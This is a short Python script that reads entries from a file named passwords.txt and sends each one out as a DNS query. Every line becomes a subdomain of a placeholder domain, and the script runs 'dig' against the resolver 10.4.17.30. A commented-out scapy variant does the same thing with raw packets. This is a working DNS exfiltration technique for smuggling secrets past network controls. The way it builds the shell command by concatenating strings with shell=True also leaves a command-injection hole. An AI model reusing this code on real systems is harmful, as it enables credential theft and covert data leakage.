import subprocess
import time
from scapy.all import *

# read passwords
with open('passwords.txt', 'r') as fp:
    for cnt, line in enumerate(fp):
        print(line)
        url = line.strip('\n') + ".whatever.com"
        command = "dig @10.4.17.30 " + url
        print(command)
        subprocess.Popen([command], shell=True)
        time.sleep(1)
        # query = IP(dst='10.4.17.30')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=url))
        # send(query,verbose=0)
